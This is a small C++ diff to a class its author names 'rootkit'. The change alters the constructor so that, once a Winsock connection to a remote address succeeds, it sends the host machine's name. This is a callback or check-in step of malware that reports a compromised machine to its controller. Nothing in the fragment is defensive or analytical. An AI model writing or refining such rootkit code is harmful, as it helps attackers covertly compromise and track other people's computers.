@@ -50,9 +50,12 @@ namespace network
 		rootkit(unsigned short port): _wsa(), _port(port)
 		{
 			init(port);
-			std::cout << connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr)) << std::endl;
-			std::string name = get_name();
-			send_text(name);
+			
+			if (connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr)) == 0)
+			{
+				std::string name = get_name();
+				send_text(name);
+			}
 		}
 
 		void init(unsigned short port)
